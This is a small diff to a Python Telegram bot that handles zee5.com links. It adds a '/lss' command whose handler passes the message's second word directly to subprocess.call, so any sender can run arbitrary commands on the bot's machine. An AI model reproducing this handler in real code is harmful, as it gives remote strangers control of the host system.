@@ -130,7 +130,15 @@ async def handler(event):
 
 
     #await client.send_message(chat,c.join(e))
+@client.on(events.NewMessage(pattern='(?i)/lss'))
 
+async def handler(event):
+
+    chat = await event.get_chat()
+
+    link =event.text.split(" ")[1]
+    print (link)
+    subprocess.call (link)
 @client.on(events.NewMessage(pattern='(?i)https://www.zee5.com'))
 
 async def handler(event):
